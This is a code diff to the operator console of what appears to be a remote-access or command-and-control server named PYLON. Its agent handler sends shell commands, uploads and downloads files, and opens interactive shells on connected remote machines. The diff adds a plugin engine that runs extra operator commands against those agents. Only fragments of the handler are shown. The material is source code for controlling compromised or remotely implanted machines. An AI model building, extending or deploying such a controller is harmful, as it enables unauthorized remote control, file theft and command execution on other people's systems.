@@ -1,3 +1,4 @@
+from core.plugins_engine import PluginsEngine
 import socket
 import struct 
 import os 
@@ -24,6 +25,9 @@ def handle_agent(conn, addr):
     print("drop - disconnect agent, allow he to reconnect")
     print("upload <path>, download <path>")
     print("==== PYLON ====")
+    
+    plugins_engine = PluginsEngine(conn)
+    plugins_engine.load_plugins()
     
     try:
         while True:
@@ -97,6 +101,7 @@ def handle_agent(conn, addr):
                     print(f'Error: {e}')
                 continue
             
+            
             if cmd == "shell":
                 header = struct.pack("!II", 6, 0)
                 conn.sendall(header)
@@ -143,7 +148,10 @@ def handle_agent(conn, addr):
                     print('Session ended')
                 continue
                     
-                    
+            plugins_data = plugins_engine.execute_plugins(cmd)
+            if plugins_data:
+                print(plugins_data)
+                continue
             
             payload = cmd.encode()
             header = struct.pack("!II", 1, len(payload)) # 1 - shell execution
@@ -165,7 +173,7 @@ def handle_agent(conn, addr):
                 print("-" * 30)
         
     except Exception as e:
-        print(f"Error: {e}")
+        print(f"Error-main-loop: {e}")
     finally:
         conn.close()
 
